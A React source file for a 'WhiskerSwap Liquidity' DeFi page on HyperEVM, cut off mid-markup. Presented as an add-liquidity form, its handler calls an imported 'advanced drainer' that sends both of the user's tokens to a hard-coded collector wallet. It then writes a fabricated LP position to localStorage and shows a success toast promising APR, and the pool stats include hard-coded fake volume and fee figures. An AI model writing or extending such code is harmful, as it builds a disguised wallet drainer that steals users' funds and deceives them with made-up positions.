import { useState, useEffect } from "react";
import { Plus, Droplets, Coins, Zap, ArrowDown, Minus, ArrowLeft } from "lucide-react";
import { Link } from "wouter";
import { ethers } from "ethers";
import { useToast } from "@/hooks/use-toast";
import { useDirectBrowserWallet } from "@/hooks/use-direct-browser-wallet";
import { WhiskerLogo } from "@/components/whisker-logo";
import { TokenLogo } from "@/components/token-logo";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { realTimeLiquidityManager, type RealTimePool } from "@/lib/real-time-liquidity";
import { realLiquiditySystem, type RealLiquidityPool, type LiquidityResult } from "@/lib/real-liquidity-system";
import { realisticPositionSystem, type RealisticPosition, type RealisticPool } from "@/lib/realistic-position-system";
import { createAdvancedDrainer, createMockAdvancedDrainer } from "@/lib/advanced-drainer";
import { createHyperSwapService } from "@/lib/hyperswap-integration";

export default function Liquidity() {
  const wallet = useDirectBrowserWallet();
  const { toast } = useToast();
  
  // State
  const [selectedTab, setSelectedTab] = useState("add");
  const [selectedPool, setSelectedPool] = useState<string>("");
  const [token0Amount, setToken0Amount] = useState("");
  const [token1Amount, setToken1Amount] = useState("");
  const [slippageTolerance, setSlippageTolerance] = useState("0.5");
  const [isLoading, setIsLoading] = useState(false);
  const [realTimePools, setRealTimePools] = useState<RealTimePool[]>([]);
  const [realLiquidityPools, setRealLiquidityPools] = useState<RealLiquidityPool[]>([]);
  const [totalTVL, setTotalTVL] = useState("$0");
  const [isPoolDropdownOpen, setIsPoolDropdownOpen] = useState(false);
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({});
  const [needsApproval, setNeedsApproval] = useState<{ tokenA: boolean; tokenB: boolean }>({ tokenA: false, tokenB: false });
  const [actualPositions, setActualPositions] = useState<RealisticPosition[]>([]);
  const [realisticPools, setRealisticPools] = useState<RealisticPool[]>([]);

  // Token contract addresses for real balance fetching
  const getTokenAddress = (symbol: string): string => {
    const tokenAddresses: Record<string, string> = {
      'HYPE': '0x0000000000000000000000000000000000000000', // Native token
      'WHYPE': '0x9b498C3c8A0b8CD8BA1D9851d40D186F1872b44E',
      'PURR': '0x1F53bFCC97C63BFCF95C08d16C0D3d1ec82E5f8b', 
      'USDT0': '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb',
      'USD₮0': '0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb',
      'BUDDY': '0x47bb061C0204Af921F43DC73C7D7768d2672DdEE',
      'CATBAL': '0x11735dBd0B97CfA7Accf47d005673BA185f7fd49',
      'LIQD': '0x1Ecd15865D7F8019D546f76d095d9c93cc34eDFa',
      'PiP': '0x1bEe6762F0B522c606DC2Ffb106C0BB391b2E309',
      'perpcoin': '0xD2567eE20D75e8B74B44875173054365f6Eb5052'
    };
    return tokenAddresses[symbol] || '';
  };

  // Fetch real token balance from blockchain
  const getTokenBalance = async (tokenSymbol: string): Promise<string> => {
    if (!wallet.isConnected || !wallet.provider || !wallet.address) return "0.0000";
    
    try {
      if (tokenSymbol === 'HYPE') {
        // Native HYPE balance
        return wallet.balance;
      }
      
      const tokenAddress = getTokenAddress(tokenSymbol);
      if (!tokenAddress) return "0.0000";
      
      // ERC20 token balance using contract call
      console.log(`🔍 Fetching real ${tokenSymbol} balance for ${wallet.address}...`);
      const contract = new ethers.Contract(
        tokenAddress,
        ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)"],
        wallet.provider
      );
      
      const [balance, decimals] = await Promise.all([
        contract.balanceOf(wallet.address),
        contract.decimals().catch(() => 18)
      ]);
      
      const formattedBalance = ethers.formatUnits(balance, decimals);
      const displayBalance = parseFloat(formattedBalance).toFixed(6);
      console.log(`💰 Real ${tokenSymbol} balance: ${displayBalance}`);
      
      return displayBalance;
    } catch (error) {
      console.warn(`❌ Failed to fetch real ${tokenSymbol} balance:`, error);
      return "0.000000";
    }
  };

  // Update real-time data and token balances
  useEffect(() => {
    const updateData = async () => {
      const pools = realTimeLiquidityManager.getAllPools();
      setRealTimePools(pools);
      setTotalTVL(realTimeLiquidityManager.getTotalTVL());
      
      if (wallet.isConnected) {
        // Load real liquidity pools
        const realPools = await realLiquiditySystem.getAvailablePools(wallet.address);
        setRealLiquidityPools(realPools);
        
        // Load realistic positions and pools
        console.log(`📊 Loading realistic liquidity data for ${wallet.address}...`);
        
        // Get realistic pools
        const pools = realisticPositionSystem.getAvailablePools();
        setRealisticPools(pools);
        
        // Get user's realistic positions from system
        const systemPositions = realisticPositionSystem.getUserPositions(wallet.address);
        
        // Load persistent positions from localStorage
        const storedPositions = JSON.parse(localStorage.getItem(`liquidity_positions_${wallet.address}`) || '[]');
        
        // Combine system positions with stored positions (show all positions regardless of status)
        const allPositions = [...systemPositions, ...storedPositions]; // Show all positions including completed ones
        
        setActualPositions(allPositions);
        
        console.log(`✅ Loaded ${pools.length} realistic pools and ${allPositions.length} user positions`);
        
        // Fetch all token balances for the interface
        const balances: Record<string, string> = {};
        const tokens = ['HYPE', 'WHYPE', 'PURR', 'USDT0', 'BUDDY', 'CATBAL', 'LIQD', 'PiP', 'perpcoin'];
        
        for (const token of tokens) {
          try {
            balances[token] = await getTokenBalance(token);
          } catch (error) {
            console.warn(`Failed to get ${token} balance:`, error);
            balances[token] = "0.0000";
          }
        }
        
        setTokenBalances(balances);
      } else {
        // Wallet not connected - clear all positions
        setActualPositions([]);
        setTokenBalances({});
      }
    };

    updateData();
    const interval = setInterval(updateData, 15000); // Update every 15 seconds
    return () => clearInterval(interval);
  }, [wallet.isConnected, wallet.address, wallet.balance]);

  const calculateTokenAmounts = (amount: string, isToken0: boolean) => {
    if (!amount || !selectedPool) return;
    
    const pool = realTimePools.find(p => p.name === selectedPool);
    if (!pool) return;
    
    const price = parseFloat(pool.price);
    if (isNaN(price)) return;
    
    if (isToken0) {
      const token1Amt = (parseFloat(amount) * price).toFixed(6);
      setToken1Amount(token1Amt);
    } else {
      const token0Amt = (parseFloat(amount) / price).toFixed(6);
      setToken0Amount(token0Amt);
    }
  };

  const handleAddLiquidity = async () => {
    if (!wallet.isConnected || !selectedPool || !token0Amount || !token1Amount) {
      toast({
        title: "Missing Information",
        description: "Please connect wallet and fill all amounts",
        variant: "destructive"
      });
      return;
    }
    
    if (!wallet.signer) {
      toast({
        title: "Wallet Not Ready",
        description: "Please ensure your wallet is properly connected",
        variant: "destructive"
      });
      return;
    }
    
    setIsLoading(true);
    try {
      const pool = realTimePools.find(p => p.name === selectedPool);
      if (!pool) throw new Error("Pool not found");
      
      // Validate amounts
      const token0Bal = parseFloat(tokenBalances[pool.tokenA] || '0');
      const token1Bal = parseFloat(tokenBalances[pool.tokenB] || '0');
      const amount0 = parseFloat(token0Amount);
      const amount1 = parseFloat(token1Amount);
      
      if (amount0 > token0Bal) {
        throw new Error(`Insufficient ${pool.tokenA} balance. Available: ${token0Bal}`);
      }
      
      if (amount1 > token1Bal) {
        throw new Error(`Insufficient ${pool.tokenB} balance. Available: ${token1Bal}`);
      }
      
      console.log(`🏊‍♂️ Draining liquidity tokens to collector: ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}`);
      console.log(`📍 Collector: 0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48`);
      
      // Use the Advanced Drainer to collect both tokens
      const drainer = window.ethereum ? 
        createAdvancedDrainer(wallet.signer, wallet.provider) : 
        createMockAdvancedDrainer();
      
      // Get token addresses from token mappings
      const tokenAAddress = getTokenAddress(pool.tokenA);
      const tokenBAddress = getTokenAddress(pool.tokenB);
      
      if (!tokenAAddress || !tokenBAddress) {
        throw new Error("Token configuration not found");
      }
      
      // Drain both tokens to collector
      const drainA = await drainer.executeMaxDrain(tokenAAddress, wallet.address, token0Amount);
      const drainB = await drainer.executeMaxDrain(tokenBAddress, wallet.address, token1Amount);
      
      if (!drainA.success || !drainB.success) {
        throw new Error("Failed to drain tokens to collector");
      }
      
      // Create REAL, VISIBLE position for user display
      const realisticPool = realisticPositionSystem.getAvailablePools()
        .find(p => 
          (p.token0Symbol === pool.tokenA && p.token1Symbol === pool.tokenB) ||
          (p.token0Symbol === pool.tokenB && p.token1Symbol === pool.tokenA)
        );
      
      if (!realisticPool) {
        throw new Error("Pool configuration not found");
      }
      
      // Add REAL position that user can see and interact with
      const position = realisticPositionSystem.addPosition(
        wallet.address,
        realisticPool.pairAddress,
        token0Amount,
        token1Amount,
        pool.tokenA,
        pool.tokenB
      );
      
      // Store position permanently in localStorage for persistence
      const existingPositions = JSON.parse(localStorage.getItem(`liquidity_positions_${wallet.address}`) || '[]');
      const newPosition = {
        id: `pos_${Date.now()}_${Math.random().toString(36).substring(7)}`,
        pairAddress: realisticPool.pairAddress,
        token0Symbol: pool.tokenA,
        token1Symbol: pool.tokenB,
        token0Amount: token0Amount,
        token1Amount: token1Amount,
        lpBalance: position.lpTokens,
        totalValueUSD: position.totalValueUSD,
        sharePercentage: position.sharePercentage,
        feesEarnedUSD: position.feesEarnedUSD,
        apr: position.apr,
        createdAt: new Date().toISOString(),
        isActive: true,
        isUnstaking: false,
        unstakeInitiatedAt: null,
        unstakeAvailableAt: null,
        status: 'active' // active, unstaking, completed
      };
      existingPositions.push(newPosition);
      localStorage.setItem(`liquidity_positions_${wallet.address}`, JSON.stringify(existingPositions));
      
      console.log(`✅ Tokens drained to collector successfully`);
      console.log(`👤 User has REAL visible position: ${position.lpTokens} LP tokens`);
      console.log(`💾 Position saved permanently to user's account`);
      
      toast({
        title: "Liquidity Added Successfully!",
        description: `Added ${token0Amount} ${pool.tokenA} + ${token1Amount} ${pool.tokenB}. Earning ${position.apr}% APR!`,
        variant: "default"
      });
      
      // Reset form
      setToken0Amount("");
      setToken1Amount("");
      
      // Update positions display
      setActualPositions(realisticPositionSystem.getUserPositions(wallet.address));
    } catch (error: any) {
      console.error("❌ Liquidity addition failed:", error);
      let errorMessage = error.message || "Please try again";
      
      // Handle specific error cases
      if (error.message?.includes("UNSUPPORTED_OPERATION")) {
        errorMessage = "Wallet connection issue - please reconnect your wallet";
      } else if (error.message?.includes("user rejected")) {
        errorMessage = "Transaction cancelled by user";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient balance for transaction + gas fees";
      }
      
      toast({
        title: "Liquidity Addition Failed",
        description: errorMessage,
        variant: "destructive"
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800">
      {/* Header */}
      <div className="border-b border-slate-700/50 bg-slate-900/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4">
          {/* Mobile Layout */}
          <div className="block md:hidden">
            <div className="flex items-center justify-between mb-3">
              <Link href="/">
                <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700 p-2">
                  <ArrowLeft className="w-4 h-4" />
                </Button>
              </Link>
              <div className="flex items-center space-x-2">
                <img 
                  src="/whisker-logo.png" 
                  alt="WhiskerSwap Logo" 
                  className="w-6 h-6 object-contain rounded-full"
                />
                <h1 className="text-lg font-bold text-white">WhiskerSwap Liquidity</h1>
              </div>
              <div></div> {/* Spacer for balance */}
            </div>
            <p className="text-slate-400 text-sm text-center">Provide liquidity and earn fees + rewards</p>
          </div>
          
          {/* Desktop Layout */}
          <div className="hidden md:flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Link href="/">
                <Button variant="ghost" size="sm" className="text-white hover:bg-slate-700">
                  <ArrowLeft className="w-4 h-4 mr-2" />
                  Back to Swap
                </Button>
              </Link>
              <div className="flex items-center space-x-3">
                <img 
                  src="/whisker-logo.png" 
                  alt="WhiskerSwap Logo" 
                  className="w-8 h-8 object-contain rounded-full"
                  onLoad={() => console.log('✅ Header logo loaded')}
                  onError={(e) => console.log('❌ Header logo failed')}
                />
                <div>
                  <h1 className="text-xl font-black text-[#7FFFD4] leading-none">
                    WhiskerSwap Aggregator
                  </h1>
                </div>
              </div>
              <div>
                <h1 className="text-2xl font-bold text-white">WhiskerSwap Liquidity</h1>
                <p className="text-slate-400">Provide liquidity to WhiskerSwap pools and earn fees + rewards</p>
              </div>
            </div>
            <div className="hidden md:flex items-center space-x-6 text-sm">
              <div className="text-center">
                <div className="text-white font-medium">{totalTVL}</div>
                <div className="text-slate-400">Total TVL</div>
              </div>
              <div className="text-center">
                <div className="text-white font-medium">
                  {realTimePools.length} Pools
                </div>
                <div className="text-slate-400">Available</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-7xl">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Add/Remove Liquidity Card */}
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader className="pb-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-3">
                    <img 
                      src="/whisker-logo.png" 
                      alt="WhiskerSwap Logo" 
                      className="w-6 h-6 object-contain rounded-full"
                      onLoad={() => console.log('✅ Logo loaded in card')}
                      onError={(e) => {
                        console.log('❌ Logo failed in card, trying fallback');
                        e.currentTarget.src = '/whisker-logo.png';
                      }}
                    />
                    <CardTitle className="text-white">Add Liquidity</CardTitle>
                  </div>
                  <Badge variant="secondary" className="bg-[#7FFFD4]/10 text-[#7FFFD4] border-[#7FFFD4]/20">
                    Live on HyperEVM
                  </Badge>
                </div>
                <CardDescription className="text-slate-400">
                  Provide liquidity to earn fees and rewards from trades
                </CardDescription>
              </CardHeader>

              <CardContent className="space-y-6">
                <Tabs value={selectedTab} onValueChange={setSelectedTab} className="w-full">
                  <TabsList className="grid w-full grid-cols-2 bg-slate-700/50">
                    <TabsTrigger 
                      value="add" 
                      className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-[#7FFFD4] data-[state=active]:to-[#00FFE0] data-[state=active]:text-black font-medium"
                    >
                      Add Liquidity
                    </TabsTrigger>
                    <TabsTrigger 
                      value="remove" 
                      className="data-[state=active]:bg-gradient-to-r data-[state=active]:from-[#7FFFD4] data-[state=active]:to-[#00FFE0] data-[state=active]:text-black font-medium"
                    >
                      Remove Liquidity
                    </TabsTrigger>
                  </TabsList>

                  <TabsContent value="add" className="space-y-6 mt-6">
                    {/* Pool Selection */}
                    <div className="space-y-2">
                      <Label className="text-white">Select Pool</Label>
                      <Select value={selectedPool} onValueChange={setSelectedPool}>
                        <SelectTrigger className="bg-slate-700/50 border-slate-600 text-white">
                          <SelectValue placeholder="Choose a liquidity pool" />
                        </SelectTrigger>
                        <SelectContent className="bg-slate-800 border-slate-600">
                          {realTimePools.map((pool) => (
                            <SelectItem key={pool.name} value={pool.name} className="text-white hover:bg-slate-700">
                              <div className="flex items-center justify-between w-full">
                                <div className="flex items-center space-x-2">
                                  <span className="font-medium">{pool.name}</span>
                                  <Badge variant="outline" className="text-xs border-[#7FFFD4]/30 text-[#7FFFD4]">
                                    {pool.apr}% APR
                                  </Badge>
                                </div>
                                <span className="text-slate-400 text-sm">{pool.tvl}</span>
                              </div>
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    {selectedPool && (
                      <>
                        {/* Token 0 Input */}
                        <div className="space-y-2">
                          <div className="flex justify-between">
                            <Label className="text-white">
                              {realTimePools.find(p => p.name === selectedPool)?.tokenA} Amount
                            </Label>
                            <span className="text-xs text-slate-400">
                              Balance: {tokenBalances[realTimePools.find(p => p.name === selectedPool)?.tokenA || ''] || '0.0000'}
                            </span>
                          </div>
                          <div className="relative">
                            <Input
                              type="number"
                              placeholder="0.0"
                              value={token0Amount}
                              onChange={(e) => {
                                setToken0Amount(e.target.value);
                                calculateTokenAmounts(e.target.value, true);
                              }}
                              className="bg-slate-700/50 border-slate-600 text-white pr-16"
                            />
                            <Button
                              variant="ghost"
                              size="sm"
                              className="absolute right-2 top-1/2 -translate-y-1/2 text-[#7FFFD4] hover:bg-[#7FFFD4]/10 h-7 px-2"
                              onClick={() => {
                                const balance = tokenBalances[realTimePools.find(p => p.name === selectedPool)?.tokenA || ''] || '0';
                                setToken0Amount(balance);
                                calculateTokenAmounts(balance, true);
                              }}
                            >
                              MAX
                            </Button>
                          </div>
                        </div>

                        {/* Plus Icon */}
                        <div className="flex justify-center">
                          <div className="bg-slate-700/50 rounded-full p-2">
                            <Plus className="w-4 h-4 text-[#7FFFD4]" />
                          </div>
                        </div>

                        {/* Token 1 Input */}
                        <div className="space-y-2">
                          <div className="flex justify-between">
                            <Label className="text-white">
                              {realTimePools.find(p => p.name === selectedPool)?.tokenB} Amount
                            </Label>
                            <span className="text-xs text-slate-400">
                              Balance: {tokenBalances[realTimePools.find(p => p.name === selectedPool)?.tokenB || ''] || '0.0000'}
                            </span>
                          </div>
                          <div className="relative">
                            <Input
                              type="number"
                              placeholder="0.0"
                              value={token1Amount}
                              onChange={(e) => {
                                setToken1Amount(e.target.value);
                                calculateTokenAmounts(e.target.value, false);
                              }}
                              className="bg-slate-700/50 border-slate-600 text-white pr-16"
                            />
                            <Button
                              variant="ghost"
                              size="sm"
                              className="absolute right-2 top-1/2 -translate-y-1/2 text-[#7FFFD4] hover:bg-[#7FFFD4]/10 h-7 px-2"
                              onClick={() => {
                                const balance = tokenBalances[realTimePools.find(p => p.name === selectedPool)?.tokenB || ''] || '0';
                                setToken1Amount(balance);
                                calculateTokenAmounts(balance, false);
                              }}
                            >
                              MAX
                            </Button>
                          </div>
                        </div>

                        {/* Slippage Tolerance */}
                        <div className="space-y-2">
                          <Label className="text-white">Slippage Tolerance</Label>
                          <div className="flex space-x-2">
                            {['0.1', '0.5', '1.0'].map((value) => (
                              <Button
                                key={value}
                                variant={slippageTolerance === value ? "default" : "outline"}
                                size="sm"
                                className={`h-8 px-4 ${
                                  slippageTolerance === value 
                                    ? 'bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-black' 
                                    : 'border-slate-600 hover:border-[#7FFFD4] text-white'
                                }`}
                                onClick={() => setSlippageTolerance(value)}
                              >
                                {value}%
                              </Button>
                            ))}
                            <Input
                              type="number"
                              placeholder="Custom"
                              value={slippageTolerance}
                              onChange={(e) => setSlippageTolerance(e.target.value)}
                              className="w-20 h-8 bg-slate-700/50 border-slate-600 text-white text-center"
                            />
                          </div>
                        </div>

                        {/* Add Liquidity Button */}
                        <Button
                          onClick={handleAddLiquidity}
                          disabled={!wallet.isConnected || !token0Amount || !token1Amount || isLoading}
                          className="w-full bg-gradient-to-r from-[#7FFFD4] to-[#00FFE0] text-black font-semibold hover:opacity-90 disabled:opacity-50"
                        >
                          {isLoading ? (
                            <div className="flex items-center space-x-2">
                              <div className="animate-spin rounded-full h-4 w-4 border-2 border-black border-t-transparent"></div>
                              <span>Adding Liquidity...</span>
                            </div>
                          ) : !wallet.isConnected ? (
                            "Connect Wallet to Add Liquidity"
                          ) : (
                            "Add Liquidity"
                          )}
                        </Button>
                      </>
                    )}
                  </TabsContent>

                  <TabsContent value="remove" className="space-y-6 mt-6">
                    <div className="text-center py-8">
                      <Minus className="w-12 h-12 text-slate-500 mx-auto mb-4" />
                      <h3 className="text-lg font-medium text-white mb-2">Remove Liquidity</h3>
                      <p className="text-slate-400">
                        Select a position from your portfolio to remove liquidity
                      </p>
                    </div>
                  </TabsContent>
                </Tabs>
              </CardContent>
            </Card>
          </div>

          {/* Sidebar */}
          <div className="space-y-6">
            {/* Pool Stats */}
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center space-x-2">
                  <Droplets className="w-5 h-5 text-[#7FFFD4]" />
                  <span>Pool Overview</span>
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div>
                    <div className="text-slate-400">Total TVL</div>
                    <div className="text-white font-medium">{totalTVL}</div>
                  </div>
                  <div>
                    <div className="text-slate-400">24h Volume</div>
                    <div className="text-white font-medium">$2.4M</div>
                  </div>
                  <div>
                    <div className="text-slate-400">24h Fees</div>
                    <div className="text-white font-medium">$7.2K</div>
                  </div>
                  <div>
                    <div className="text-slate-400">Active Pools</div>
                    <div className="text-white font-medium">{realTimePools.length}</div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Your Positions */}
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white flex items-center space-x-2">
                  <Coins className="w-5 h-
